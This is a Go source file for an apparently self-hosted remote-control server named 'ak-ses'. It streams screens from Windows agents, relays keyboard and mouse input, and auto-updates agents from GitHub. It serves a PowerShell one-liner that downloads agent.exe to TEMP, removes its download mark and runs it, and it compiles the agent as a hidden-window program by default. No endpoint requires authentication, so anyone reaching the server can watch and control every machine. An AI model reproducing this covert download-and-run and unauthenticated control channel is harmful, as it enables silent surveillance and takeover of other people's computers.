package main

import (
	"archive/tar"
	"compress/gzip"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	serverVersion = "v1.1.0"
)

type AgentSession struct {
	ID        string          `json:"id"`
	Hostname  string          `json:"hostname"`
	OS        string          `json:"os"`
	Version   string          `json:"version"`
	Connected time.Time       `json:"connected"`
	Displays  []interface{}   `json:"displays"`
	Conn      *websocket.Conn `json:"-"`
	mu        sync.Mutex
}

var (
	agents   = make(map[string]*AgentSession)
	agentsMu sync.RWMutex

	buildMu sync.Mutex

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true // Accepter toutes les origines pour le dashboard
		},
	}
)

func findAgentSrc(specifiedDir string) string {
	candidates := []string{
		specifiedDir,
		"./agent",
		"../agent",
	}
	if execPath, err := os.Executable(); err == nil {
		execDir := filepath.Dir(execPath)
		candidates = append(candidates,
			filepath.Join(execDir, "agent"),
			filepath.Join(execDir, "../agent"),
			filepath.Join(execDir, "../../agent"),
		)
	}
	for _, c := range candidates {
		if c == "" {
			continue
		}
		if fi, err := os.Stat(filepath.Join(c, "main.go")); err == nil && !fi.IsDir() {
			if abs, err := filepath.Abs(c); err == nil {
				return abs
			}
			return c
		}
	}
	return ""
}

func getCompilerInfo() (bool, string) {
	goPath, err := exec.LookPath("go")
	if err != nil {
		return false, "Compilateur Go ('go') introuvable dans PATH"
	}
	out, err := exec.Command(goPath, "version").CombinedOutput()
	if err != nil {
		return true, "Go présent"
	}
	return true, strings.TrimSpace(string(out))
}

type GitHubAsset struct {
	Name               string `json:"name"`
	Size               int64  `json:"size"`
	BrowserDownloadURL string `json:"browser_download_url"`
}

type GitHubRelease struct {
	TagName     string        `json:"tag_name"`
	Name        string        `json:"name"`
	Body        string        `json:"body"`
	PublishedAt string        `json:"published_at"`
	HtmlURL     string        `json:"html_url"`
	Assets      []GitHubAsset `json:"assets"`
}

func fetchLatestRelease(repo string) (*GitHubRelease, error) {
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/releases/latest", repo)
	req, err := http.NewRequest(http.MethodGet, apiURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "ak-ses-server")
	req.Header.Set("Accept", "application/vnd.github.v3+json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("GitHub API a repondu avec statut %d", resp.StatusCode)
	}

	var rel GitHubRelease
	if err := json.NewDecoder(resp.Body).Decode(&rel); err != nil {
		return nil, err
	}
	return &rel, nil
}

func downloadAsset(assetURL, destPath string) error {
	client := &http.Client{Timeout: 120 * time.Second}
	req, err := http.NewRequest(http.MethodGet, assetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "ak-ses-server")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("statut HTTP %d lors du telechargement", resp.StatusCode)
	}

	tmpFile := destPath + fmt.Sprintf(".tmp_%d", time.Now().UnixNano())
	out, err := os.OpenFile(tmpFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}

	written, err := io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		_ = os.Remove(tmpFile)
		return err
	}

	if written < 100000 {
		_ = os.Remove(tmpFile)
		return fmt.Errorf("fichier telecharge incomplet (%d octets)", written)
	}

	_ = os.Remove(destPath)
	if err := os.Rename(tmpFile, destPath); err != nil {
		_ = os.Remove(tmpFile)
		return err
	}

	return nil
}

func extractAndApplyServerTarGz(tarGzPath, targetDir string) error {
	f, err := os.Open(tarGzPath)
	if err != nil {
		return err
	}
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil {
		return err
	}
	defer gz.Close()

	tr := tar.NewReader(gz)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		cleanName := filepath.Clean(hdr.Name)
		if strings.HasPrefix(cleanName, "..") || cleanName == "." {
			continue
		}

		destPath := filepath.Join(targetDir, cleanName)
		if hdr.Typeflag == tar.TypeDir {
			_ = os.MkdirAll(destPath, 0755)
			continue
		}

		if hdr.Typeflag == tar.TypeReg {
			_ = os.MkdirAll(filepath.Dir(destPath), 0755)
			tmpDest := destPath + fmt.Sprintf(".tmp_%d", time.Now().UnixNano())
			out, err := os.OpenFile(tmpDest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, os.FileMode(hdr.Mode))
			if err != nil {
				continue
			}
			_, _ = io.Copy(out, tr)
			out.Close()
			_ = os.Chmod(tmpDest, os.FileMode(hdr.Mode))
			_ = os.Remove(destPath)
			if err := os.Rename(tmpDest, destPath); err != nil {
				data, rErr := os.ReadFile(tmpDest)
				if rErr == nil {
					_ = os.WriteFile(destPath, data, os.FileMode(hdr.Mode))
				}
				_ = os.Remove(tmpDest)
			}
		}
	}
	return nil
}

func autoUpdateRoutine(repo, binDir string) {
	// Attendre 15s au demarrage pour laisser le serveur initialiser son ecoute
	time.Sleep(15 * time.Second)

	check := func() {
		rel, err := fetchLatestRelease(repo)
		if err != nil {
			return
		}

		var agentAsset, serverLinuxAsset string
		for _, a := range rel.Assets {
			nameLower := strings.ToLower(a.Name)
			if strings.Contains(nameLower, "agent") && strings.HasSuffix(nameLower, ".exe") {
				agentAsset = a.BrowserDownloadURL
			}
			if strings.Contains(nameLower, "server-linux") && strings.HasSuffix(nameLower, ".tar.gz") {
				serverLinuxAsset = a.BrowserDownloadURL
			}
		}

		agentPath := filepath.Join(binDir, "agent.exe")
		agentExists := false
		if _, err := os.Stat(agentPath); err == nil {
			agentExists = true
		}

		// 1. Auto-update du binaire agent si nouvelle release OU si agent.exe absent
		if (rel.TagName != serverVersion || !agentExists) && agentAsset != "" {
			log.Printf("[*] Auto-update agent: telechargement %s depuis release %s...", agentAsset, rel.TagName)
			if err := downloadAsset(agentAsset, agentPath); err == nil {
				log.Printf("[+] Binaire agent.exe mis a jour vers %s", rel.TagName)
				sendUpdateToAgents("", rel.TagName, "/dl/agent.exe")
			} else {
				log.Printf("[-] Echec auto-update agent.exe: %v", err)
			}
		}

		// 2. Auto-update du serveur lui-meme si nouvelle release et execution sur Linux
		if rel.TagName != serverVersion && runtime.GOOS == "linux" && serverLinuxAsset != "" {
			log.Printf("[*] Auto-update serveur: nouvelle version %s detectee (actuelle: %s)", rel.TagName, serverVersion)
			execDir := "."
			if p, err := os.Executable(); err == nil {
				execDir = filepath.Dir(p)
			}
			tmpTarGz := filepath.Join(binDir, fmt.Sprintf("server_update_%s.tar.gz", rel.TagName))
			if err := downloadAsset(serverLinuxAsset, tmpTarGz); err == nil {
				log.Printf("[+] Archive release serveur telechargee. Application des fichiers dans %s...", execDir)
				if err := extractAndApplyServerTarGz(tmpTarGz, execDir); err == nil {
					_ = os.Remove(tmpTarGz)
					log.Printf("[+] Serveur mis a jour vers %s avec succes ! Redemarrage automatique du service...", rel.TagName)
					time.Sleep(1 * time.Second)
					os.Exit(0) // Systemd (Restart=always) redemarre le serveur sous 3s
				} else {
					log.Printf("[-] Echec extraction mise a jour serveur: %v", err)
				}
				_ = os.Remove(tmpTarGz)
			} else {
				log.Printf("[-] Echec telechargement release serveur: %v", err)
			}
		}
	}

	// Verification initiale au demarrage
	check()

	// Verification periodique toutes les 15 minutes
	ticker := time.NewTicker(15 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		check()
	}
}

func sendUpdateToAgents(targetAgentID, version, downloadURL string) []string {
	agentsMu.RLock()
	defer agentsMu.RUnlock()

	sep := "?"
	if strings.Contains(downloadURL, "?") {
		sep = "&"
	}
	cacheBustedURL := fmt.Sprintf("%s%st=%d", downloadURL, sep, time.Now().Unix())

	msg, _ := json.Marshal(map[string]interface{}{
		"type":    "self_update",
		"version": version,
		"url":     cacheBustedURL,
	})

	var updated []string
	for id, a := range agents {
		if targetAgentID != "" && id != targetAgentID {
			continue
		}
		if a.Conn != nil {
			a.mu.Lock()
			err := a.Conn.WriteMessage(websocket.TextMessage, msg)
			a.mu.Unlock()
			if err == nil {
				updated = append(updated, id)
				log.Printf("[+] Ordre de mise a jour envoye a l'agent: %s (vers %s)", id, version)
			} else {
				log.Printf("[-] Echec envoi mise a jour a l'agent %s: %v", id, err)
			}
		}
	}
	return updated
}

func main() {
	port := flag.Int("port", 8080, "Port d'écoute du serveur")
	binDir := flag.String("bin-dir", "./bin", "Dossier contenant l'agent compilé")
	agentSrc := flag.String("agent-src", "./agent", "Dossier contenant les sources Go de l'agent")
	gitRepo := flag.String("repo", "p7p55b/ak-ses", "Repository GitHub pour les mises a jour (owner/repo)")
	autoUpdate := flag.Bool("auto-update", true, "Verification et application automatique des mises a jour GitHub")
	flag.Parse()

	_ = os.MkdirAll(*binDir, 0755)

	if *autoUpdate {
		go autoUpdateRoutine(*gitRepo, *binDir)
	}

	// 1. Route pour télécharger l'agent via cmd / powershell / curl / certutil
	http.HandleFunc("/dl/agent.exe", func(w http.ResponseWriter, r *http.Request) {
		agentPath := filepath.Join(*binDir, "agent.exe")
		if _, err := os.Stat(agentPath); os.IsNotExist(err) {
			http.Error(w, "Agent non encore compilé sur le serveur (agent.exe introuvable)", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		w.Header().Set("Pragma", "no-cache")
		w.Header().Set("Expires", "0")
		http.ServeFile(w, r, agentPath)
	})

	// 1.bis Script PowerShell one-liner à télécharger ou exécuter
	http.HandleFunc("/dl/run.ps1", func(w http.ResponseWriter, r *http.Request) {
		host := r.URL.Query().Get("server")
		if host == "" {
			host = r.Host
		}
		proto := "http"
		cleanHost := strings.Split(host, ":")[0]
		if r.TLS != nil || r.Header.Get("X-Forwarded-Proto") == "https" || strings.Contains(r.Header.Get("CF-Visitor"), "https") {
			proto = "https"
		} else if strings.Contains(cleanHost, ".") &&
			!strings.HasPrefix(cleanHost, "127.") &&
			!strings.HasPrefix(cleanHost, "192.168.") &&
			!strings.HasPrefix(cleanHost, "10.") &&
			!strings.HasPrefix(cleanHost, "172.") &&
			cleanHost != "localhost" {
			proto = "https"
		}
		script := fmt.Sprintf(`[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor 3072
Stop-Process -Name "agent" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 600
$url = "%s://%s/dl/agent.exe?t=%d"
$out = "$env:TEMP\agent.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $out)
Unblock-File $out -ErrorAction SilentlyContinue
Start-Process -FilePath $out -ArgumentList "-server %s" -NoNewWindow
`, proto, host, time.Now().Unix(), host)
		w.Header().Set("Content-Type", "text/plain")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		w.Write([]byte(script))
	})

	// 2. API pour lister les agents connectés
	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		agentsMu.RLock()
		defer agentsMu.RUnlock()

		list := make([]*AgentSession, 0, len(agents))
		for _, a := range agents {
			list = append(list, a)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)
	})

	// 2.bis API d'information sur le compilateur et l'agent
	http.HandleFunc("/api/compiler-info", func(w http.ResponseWriter, r *http.Request) {
		goOk, goVer := getCompilerInfo()
		srcDir := findAgentSrc(*agentSrc)
		agentPath := filepath.Join(*binDir, "agent.exe")
		fi, statErr := os.Stat(agentPath)

		resp := map[string]interface{}{
			"go_installed":    goOk,
			"go_version":      goVer,
			"agent_src_found": srcDir != "",
			"agent_src_dir":   srcDir,
			"agent_exists":    statErr == nil,
			"current_host":    r.Host,
		}
		if statErr == nil {
			resp["agent_size"] = fi.Size()
			resp["agent_modified"] = fi.ModTime().Format("2006-01-02 15:04:05")
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	})

	// 2.ter API pour compiler une version personnalisée de l'agent
	http.HandleFunc("/api/compile", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Méthode non autorisée (POST requis)", http.StatusMethodNotAllowed)
			return
		}

		type CompileReq struct {
			Server      string `json:"server"`
			HideConsole *bool  `json:"hide_console"`
			Arch        string `json:"arch"`
		}

		var req CompileReq
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			// Si le body n'est pas du JSON, tester si passé en query
			req.Server = r.URL.Query().Get("server")
		}

		serverHost := strings.TrimSpace(req.Server)
		if serverHost == "" {
			serverHost = r.Host
		}

		// Nettoyage de l'adresse saisie
		serverHost = strings.TrimPrefix(serverHost, "https://")
		serverHost = strings.TrimPrefix(serverHost, "http://")
		serverHost = strings.TrimRight(serverHost, "/")
		serverHost = strings.TrimSpace(serverHost)

		if serverHost == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Nom de domaine ou adresse du serveur invalide/vide.",
			})
			return
		}

		arch := req.Arch
		if arch == "" {
			arch = "amd64"
		}

		hideConsole := true
		if req.HideConsole != nil {
			hideConsole = *req.HideConsole
		}

		buildMu.Lock()
		defer buildMu.Unlock()

		goPath, err := exec.LookPath("go")
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Compilateur Go ('go') introuvable dans le PATH du serveur.",
			})
			return
		}

		realSrc := findAgentSrc(*agentSrc)
		if realSrc == "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Dossier source de l'agent ('agent/main.go') introuvable sur le serveur.",
			})
			return
		}

		_ = os.MkdirAll(*binDir, 0755)
		tmpExe := filepath.Join(*binDir, fmt.Sprintf("agent_build_%d.exe", time.Now().UnixNano()))
		targetExe := filepath.Join(*binDir, "agent.exe")

		ldflags := fmt.Sprintf("-X 'main.defaultServer=%s' -X 'main.agentVersion=%s' -s -w", serverHost, serverVersion)
		if hideConsole {
			ldflags += " -H=windowsgui"
		}

		homeDir, _ := os.UserHomeDir()
		if homeDir == "" {
			homeDir = "/root"
		}

		buildCmd := exec.Command(goPath, "build", "-trimpath", "-ldflags", ldflags, "-o", tmpExe, ".")
		buildCmd.Dir = realSrc
		buildCmd.Env = append(os.Environ(),
			"CGO_ENABLED=0",
			"GOOS=windows",
			fmt.Sprintf("GOARCH=%s", arch),
			"HOME="+homeDir,
			"GOPATH="+filepath.Join(homeDir, "go"),
			"GOCACHE="+filepath.Join(homeDir, ".cache", "go-build"),
			"GOMODCACHE="+filepath.Join(homeDir, "go", "pkg", "mod"),
		)

		log.Printf("[*] Compilation agent en cours pour '%s' (arch: %s, gui: %v)...", serverHost, arch, hideConsole)
		start := time.Now()
		output, err := buildCmd.CombinedOutput()
		elapsed := time.Since(start)

		if err != nil {
			_ = os.Remove(tmpExe)
			log.Printf("[-] Échec compilation: %v\n%s", err, string(output))
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   fmt.Sprintf("Erreur compilation: %v", err),
				"output":  string(output),
			})
			return
		}

		// Signature si script sign_agent.ps1 disponible et sur Windows
		if runtime.GOOS == "windows" {
			signScript := "sign_agent.ps1"
			if _, statErr := os.Stat(signScript); statErr == nil {
				_ = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", signScript).Run()
			}
		}

		// Remplacement sécurisé du fichier agent.exe
		_ = os.Remove(targetExe)
		if err := os.Rename(tmpExe, targetExe); err != nil {
			// Repli sur copie binaire si rename entre volumes différents ou verrouillé
			input, rErr := os.ReadFile(tmpExe)
			if rErr == nil {
				_ = os.WriteFile(targetExe, input, 0755)
				_ = os.Remove(tmpExe)
			} else {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"error":   fmt.Sprintf("Erreur remplacement agent.exe: %v", rErr),
				})
				return
			}
		}

		fi, statErr := os.Stat(targetExe)
		var size int64 = 0
		if statErr == nil {
			size = fi.Size()
		}

		log.Printf("[+] Agent compilé avec succès en %v (%d octets) pour '%s'", elapsed.Round(time.Millisecond), size, serverHost)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":      true,
			"server":       serverHost,
			"size":         size,
			"duration_ms":  elapsed.Milliseconds(),
			"download_url": fmt.Sprintf("/dl/agent.exe?v=%d", time.Now().Unix()),
			"build_time":   time.Now().Format("2006-01-02 15:04:05"),
			"message":      fmt.Sprintf("Agent compilé avec succès pour '%s' (taille: %.2f MB)", serverHost, float64(size)/(1024*1024)),
		})
	})

	// 2.quater API pour verifier les mises a jour GitHub
	http.HandleFunc("/api/updates/check", func(w http.ResponseWriter, r *http.Request) {
		rel, err := fetchLatestRelease(*gitRepo)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadGateway)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   fmt.Sprintf("Erreur requete GitHub: %v", err),
			})
			return
		}

		var assetName, assetURL string
		var assetSize int64
		for _, a := range rel.Assets {
			if strings.Contains(strings.ToLower(a.Name), "agent") && strings.HasSuffix(strings.ToLower(a.Name), ".exe") {
				assetName = a.Name
				assetURL = a.BrowserDownloadURL
				assetSize = a.Size
				break
			}
		}

		agentsMu.RLock()
		totalAgents := len(agents)
		outdatedCount := 0
		for _, a := range agents {
			if a.Version != rel.TagName {
				outdatedCount++
			}
		}
		agentsMu.RUnlock()

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":                true,
			"repo":                   *gitRepo,
			"current_server_version": serverVersion,
			"latest_version":         rel.TagName,
			"release_name":           rel.Name,
			"release_notes":          rel.Body,
			"published_at":           rel.PublishedAt,
			"html_url":               rel.HtmlURL,
			"asset_name":             assetName,
			"asset_url":              assetURL,
			"asset_size":             assetSize,
			"update_available":       rel.TagName != serverVersion,
			"connected_agents_count": totalAgents,
			"outdated_agents_count":  outdatedCount,
		})
	})

	// 2.quinquies API pour appliquer la mise a jour GitHub (telechargement release + envoi ordre aux agents)
	http.HandleFunc("/api/updates/apply", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "POST requis", http.StatusMethodNotAllowed)
			return
		}

		type ApplyReq struct {
			AgentID         string `json:"agent_id"`
			DownloadRelease *bool  `json:"download_release"`
			Version         string `json:"version"`
			URL             string `json:"url"`
		}
		var req ApplyReq
		_ = json.NewDecoder(r.Body).Decode(&req)

		downloadRelease := true
		if req.DownloadRelease != nil {
			downloadRelease = *req.DownloadRelease
		}

		targetVersion := req.Version
		downloadURL := req.URL
		if downloadURL == "" {
			downloadURL = "/dl/agent.exe"
		}

		if downloadRelease {
			rel, err := fetchLatestRelease(*gitRepo)
			if err != nil {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusBadGateway)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"error":   fmt.Sprintf("Erreur verification release GitHub: %v", err),
				})
				return
			}

			targetVersion = rel.TagName
			var assetURL string
			for _, a := range rel.Assets {
				if strings.Contains(strings.ToLower(a.Name), "agent") && strings.HasSuffix(strings.ToLower(a.Name), ".exe") {
					assetURL = a.BrowserDownloadURL
					break
				}
			}

			if assetURL == "" {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusNotFound)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"error":   "Aucun asset agent .exe trouve dans la release GitHub.",
				})
				return
			}

			log.Printf("[*] Telechargement de la release GitHub: %s (%s)...", rel.TagName, assetURL)
			agentPath := filepath.Join(*binDir, "agent.exe")
			if err := downloadAsset(assetURL, agentPath); err != nil {
				log.Printf("[-] Echec telechargement release: %v", err)
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"error":   fmt.Sprintf("Erreur telechargement du binaire release: %v", err),
				})
				return
			}
			log.Printf("[+] Binaire release %s installe dans %s", rel.TagName, agentPath)
		}

		if targetVersion == "" {
			targetVersion = "latest"
		}

		updated := sendUpdateToAgents(req.AgentID, targetVersion, downloadURL)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":        true,
			"version":        targetVersion,
			"updated_agents": updated,
			"count":          len(updated),
			"message":        fmt.Sprintf("Ordre de mise a jour diffuse a %d agent(s)", len(updated)),
		})
	})

	// 2.sexies API pour diffuser le binaire agent localement compile (/dl/agent.exe)
	http.HandleFunc("/api/updates/push-local", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "POST requis", http.StatusMethodNotAllowed)
			return
		}
		type PushReq struct {
			AgentID string `json:"agent_id"`
		}
		var req PushReq
		_ = json.NewDecoder(r.Body).Decode(&req)

		agentPath := filepath.Join(*binDir, "agent.exe")
		if _, err := os.Stat(agentPath); os.IsNotExist(err) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "Binaire agent.exe introuvable sur le serveur (compilez-le d'abord)",
			})
			return
		}

		updated := sendUpdateToAgents(req.AgentID, "local-build", "/dl/agent.exe")
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success":        true,
			"version":        "local-build",
			"updated_agents": updated,
			"count":          len(updated),
			"message":        fmt.Sprintf("Ordre de mise a jour diffuse a %d agent(s)", len(updated)),
		})
	})

	// 3. WebSocket pour l'Agent (flux vidéo + réception inputs)
	http.HandleFunc("/ws/agent", handleAgentWS)

	// 4. WebSocket pour le Dashboard Admin (réception flux vidéo + envoi inputs)
	http.HandleFunc("/ws/admin", handleAdminWS)

	// 5. Interface Web Dashboard
	http.Handle("/", http.FileServer(http.Dir("./web")))

	addr := fmt.Sprintf(":%d", *port)
	log.Printf("======================================================")
	log.Printf("  Serveur ak-ses en écoute sur http://0.0.0.0%s", addr)
	log.Printf("  Dashboard Admin : http://localhost:%d", *port)
	log.Printf("  Téléchargement Agent : http://localhost:%d/dl/agent.exe", *port)
	log.Printf("======================================================")

	if err := http.ListenAndServe(addr, nil); err != nil {
		log.Fatalf("[-] Erreur serveur: %v", err)
	}
}

// WebSocket Agent
func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (agent): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	if agentID == "" {
		agentID = fmt.Sprintf("agent-%d", time.Now().Unix())
	}
	hostname := r.URL.Query().Get("hostname")
	osName := r.URL.Query().Get("os")
	agentVer := r.URL.Query().Get("version")
	if agentVer == "" {
		agentVer = "v1.0.0"
	}

	session := &AgentSession{
		ID:        agentID,
		Hostname:  hostname,
		OS:        osName,
		Version:   agentVer,
		Connected: time.Now(),
		Conn:      conn,
	}

	agentsMu.Lock()
	agents[agentID] = session
	agentsMu.Unlock()

	log.Printf("[+] Machine connectée: %s (%s, %s, %s)", agentID, hostname, osName, agentVer)

	// Si un admin regardait deja cette machine, lui demander d'activer le stream
	if countViewers(agentID) > 0 {
		notifyAgentStreamControl(agentID, true, 20)
	}

	// Si l'agent connecte est dans une version plus ancienne que le serveur, lancer la mise a jour automatique
	if agentVer != "" && agentVer != serverVersion {
		log.Printf("[*] Agent %s connecte avec version obsolete (%s vs serveur %s). Envoi auto-update...", agentID, agentVer, serverVersion)
		go func(id string) {
			time.Sleep(2 * time.Second)
			sendUpdateToAgents(id, serverVersion, "/dl/agent.exe")
		}(agentID)
	}

	defer func() {
		agentsMu.Lock()
		delete(agents, agentID)
		agentsMu.Unlock()
		log.Printf("[-] Machine déconnectée: %s", agentID)
		notifyAgentDisconnect(agentID)
	}()

	// Détecte une déconnexion brutale (crash/wifi coupé) sous 6s
	conn.SetReadDeadline(time.Now().Add(6 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
		return nil
	})

	// L'agent envoie des frames binaires ou des messages texte (displays info)
	for {
		conn.SetReadDeadline(time.Now().Add(6 * time.Second))
		msgType, data, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.BinaryMessage {
			// Diffuser l'image aux admins qui contrôlent cette machine
			broadcastFrame(agentID, data)
		} else if msgType == websocket.TextMessage {
			// Traitement d'informations de l'agent (ex: liste d'écrans)
			var msg map[string]interface{}
			if err := json.Unmarshal(data, &msg); err == nil {
				if msg["type"] == "displays" {
					if disps, ok := msg["displays"].([]interface{}); ok {
						agentsMu.Lock()
						if a, exists := agents[agentID]; exists {
							a.Displays = disps
						}
						agentsMu.Unlock()
						broadcastMessage(agentID, data)
					}
				}
			}
		}
	}
}

// Gestion des sessions Admin
type AdminViewer struct {
	agentID string
	conn    *websocket.Conn
}

var (
	viewers   = make(map[*websocket.Conn]*AdminViewer)
	viewersMu sync.RWMutex
)

func broadcastFrame(agentID string, frame []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.BinaryMessage, frame)
		}
	}
}

func broadcastMessage(agentID string, msg []byte) {
	viewersMu.RLock()
	defer viewersMu.RUnlock()

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			conn.WriteMessage(websocket.TextMessage, msg)
		}
	}
}

func notifyAgentDisconnect(agentID string) {
	viewersMu.Lock()
	defer viewersMu.Unlock()

	msg, _ := json.Marshal(map[string]interface{}{
		"type":     "target_disconnected",
		"agent_id": agentID,
	})

	for conn, viewer := range viewers {
		if viewer.agentID == agentID {
			_ = conn.WriteMessage(websocket.TextMessage, msg)
			_ = conn.Close()
			delete(viewers, conn)
		}
	}
}

func countViewers(agentID string) int {
	viewersMu.RLock()
	defer viewersMu.RUnlock()
	c := 0
	for _, v := range viewers {
		if v.agentID == agentID {
			c++
		}
	}
	return c
}

func notifyAgentStreamControl(agentID string, start bool, fps int) {
	agentsMu.RLock()
	agent, exists := agents[agentID]
	agentsMu.RUnlock()
	if !exists || agent.Conn == nil {
		return
	}
	msgType := "stream_stop"
	if start {
		msgType = "stream_start"
	}
	msg, _ := json.Marshal(map[string]interface{}{
		"type": msgType,
		"fps":  fps,
	})
	agent.mu.Lock()
	_ = agent.Conn.WriteMessage(websocket.TextMessage, msg)
	agent.mu.Unlock()
	log.Printf("[*] Stream control vers %s: %s (viewers actifs: %d)", agentID, msgType, countViewers(agentID))
}

func handleAdminWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[-] Upgrade error (admin): %v", err)
		return
	}
	defer conn.Close()

	agentID := r.URL.Query().Get("id")
	viewer := &AdminViewer{
		agentID: agentID,
		conn:    conn,
	}

	viewersMu.Lock()
	previousCount := 0
	for _, v := range viewers {
		if v.agentID == agentID {
			previousCount++
		}
	}
	viewers[conn] = viewer
	viewersMu.Unlock()

	log.Printf("[+] Admin a ouvert le contrôle de l'agent: %s (viewers: %d)", agentID, previousCount+1)

	// Demarrer le flux video a la demande si premier viewer
	if previousCount == 0 {
		notifyAgentStreamControl(agentID, true, 20)
	}

	defer func() {
		viewersMu.Lock()
		delete(viewers, conn)
		remainingCount := 0
		for _, v := range viewers {
			if v.agentID == agentID {
				remainingCount++
			}
		}
		viewersMu.Unlock()
		log.Printf("[-] Admin a fermé le contrôle de l'agent: %s (viewers restants: %d)", agentID, remainingCount)

		// Mettre en veille complete le flux video si plus aucun admin ne regarde
		if remainingCount == 0 {
			notifyAgentStreamControl(agentID, false, 0)
		}
	}()

	// L'admin envoie des commandes (clavier/souris)
	for {
		msgType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if msgType == websocket.TextMessage {
			agentsMu.RLock()
			agent, exists := agents[agentID]
			agentsMu.RUnlock()

			if exists && agent.Conn != nil {
				agent.mu.Lock()
				agent.Conn.WriteMessage(websocket.TextMessage, message)
				agent.mu.Unlock()
			}
		}
	}
}
